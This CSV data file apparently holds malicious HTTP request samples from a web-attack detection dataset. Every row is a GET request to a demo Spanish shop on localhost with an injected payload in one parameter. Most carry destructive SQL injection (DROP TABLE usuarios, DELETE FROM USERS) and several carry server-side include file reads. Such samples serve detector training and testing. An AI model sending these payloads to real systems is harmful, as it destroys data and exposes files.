id,text
8881,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&pwd=ensa%F1ada&remember=on&B1=Entrar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
9257,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mcnair&pwd=81cob6r&remember=off&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
9463,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rizzardi&pwd=332G3le8a&remember=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Entrar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
4729,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=85&cantidad=18&B1=A%F1adir+al+carrito HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
1968,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&login=hua-yuan&pwd=*anoria&remember=off&B1=Entrar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
19352,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&login=chaar&pwd=pe4ibl171o&remember=on&B1=Entrar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
16745,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ohio&pwd=acerrador%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&remember=off&B1=Entrar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
17727,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=100&cantidad=97&B1=A%F1adir+al+carrito HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
19937,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=zaretsky&pwd=725l479zo&remember=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Entrar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
12852,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=alvarez&pwd=9ec828%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&remember=on&B1=Entrar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
9272,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&login=jeanes&pwd=d%F3712&remember=on&B1=Entrar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
20972,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&login=chaar&pwd=pe4ibl171o&remember=on&B1=Entrar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
6584,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=catlin&pwd=v76c088rA&remember=off%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Entrar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
4911,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&nombre=Vino+Rioja&precio=100&cantidad=2&B1=A%F1adir+al+carrito HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
7061,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=21&B1=A%F1adir+al+carrito HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
11576,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=A%F1adir+al+carrito HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
8727,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=39&cantidad=15&B1=A%F1adir+al+carrito HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
11160,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=A%F1adir+al+carrito HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
11971,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=A%F1adir+al+carrito HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
19384,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&precio=3086&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
11202,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&precio=6471&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
16427,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&precio=6458&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
1182,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=100&cantidad=43&B1=A%F1adir+al+carrito HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
2091,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&cantidad=90&B1=A%F1adir+al+carrito HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
9679,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=715&B1=Pasar+por+caja%27+DELETE+FROM+USERS HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
13428,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27+DELETE+FROM+USERS&precio=5781&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
11541,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27+DELETE+FROM+USERS&precio=4903&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
10108,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27+DELETE+FROM+USERS&precio=843&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
1847,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=74&B1=A%F1adir+al+carrito%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
1287,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3748&B1=Pasar+por+caja%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
22031,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5562%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
7911,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7686&B1=Pasar+por+caja%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
7049,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=97&B1=A%F1adir+al+carrito HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
2046,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
12347,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
3218,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=93&B1=A%F1adir+al+carrito%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
11176,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
24695,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
8091,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
4581,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
21443,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
1468,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
